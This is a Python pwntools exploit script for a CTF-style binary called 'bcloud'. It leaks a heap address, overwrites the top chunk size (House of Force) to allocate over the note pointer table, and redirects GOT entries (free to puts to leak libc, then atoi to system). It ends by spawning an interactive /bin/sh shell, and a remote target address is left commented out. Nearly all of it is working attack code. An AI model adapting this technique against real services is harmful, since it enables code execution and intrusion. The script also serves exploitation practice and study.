from pwn import *
import struct

stI=struct.Struct('I')

#context.log_level = 'DEBUG'
#
elf = ELF('./bcloud')


def init_proc(io, name, org, host):
	res = ''
	res += io.recvuntil('name:')
	io.send(name)
	res += io.recvuntil('Org:')
	io.send(org)
	res += io.recvuntil('Host:')
	io.send(host)
	return res

def show_menu(io):
	return io.recvuntil('option--->>')

def new_note(io, length, content):
	io.send('1' + '\n')
	io.recvuntil('content:')
	io.send(str(length) + '\n')
	io.recvuntil('content:')
	io.send(content)

def show_note(io):
	io.send('2' + '\n')

def edit_note(io, no, content):
	io.send('3' + '\n')
	io.recvuntil('id:')
	io.send(str(no) + '\n')
	io.recvuntil('content:')
	io.send(content)

def delete_note(io, no):
	io.send('4' + '\n')
	io.recvuntil('id:')
	io.send(str(no) + '\n')

def Syn(io):
	io.send('5' + '\n')


io = process('./bcloud')
#pwnlib.gdb.attach(io, execute = open('./expshell' ) )

#io = remote('202.120.7.207', 52608)

fake_size = 0xffffffff

res = init_proc(io, name = 'N'*0x40, org = 'O'*0x40, host = p32(fake_size) + 'H' * 0x3c)

res = res[85:89]
heap_base = stI.unpack(res)[0]
heap_base = heap_base - 0x8
log.info('heap_base is 0x%x'%heap_base)

Top_addr = heap_base + 0xd8
note0_addr = 0x804b120
note1_addr = 0x804b124

plt_puts = 0x8048520

got_puts = 0x804b024
got_atoi = 0x804b03c
got_free = 0x804b014

puts_offset = 0x63150
system_offset = 0x3b990 + 0x100

stdjunk = ''
for i in range(0, 16):
	stdjunk += 'B%03d'%i

fix_offset = 0x14
#fix_offset = 0x4
#fix_offset = 0x8

#fix_offset should < 0x10

show_menu(io)
#new_note(io, got_free - Top_addr - fix_offset,  '\n')
new_note(io, note1_addr - Top_addr - fix_offset,  '\n')
#note1_addr or note0_addr doesn't matter
show_menu(io)
new_note(io, 0x10, '\n')
show_menu(io)
new_note(io, 0x10, '\n')

show_menu(io)
edit_note(io, 1, p32(got_free) + p32(note1_addr) + p32(got_free) + '\n')
show_menu(io)
edit_note(io, 2, p32(plt_puts)+'\n')
show_menu(io)
edit_note(io, 1, p32(note1_addr) + p32(got_puts) + '\n')

show_menu(io)
delete_note(io, 2)

ret = show_menu(io)


libc_buf = ret[1:5]
libc_base = u32(libc_buf)
log.info('puts_addr is 0x%x'%libc_base)
libc_base = libc_base - puts_offset
system_addr = libc_base + system_offset

log.info('system_addr is 0x%x'%system_addr)

new_note(io, 0x10, '\n')
edit_note(io, 1, p32(note1_addr) + p32(got_atoi)+'\n')
edit_note(io, 2, p32(system_addr)+'\n')

show_menu(io)
io.send('/bin/sh\n')


io.interactive()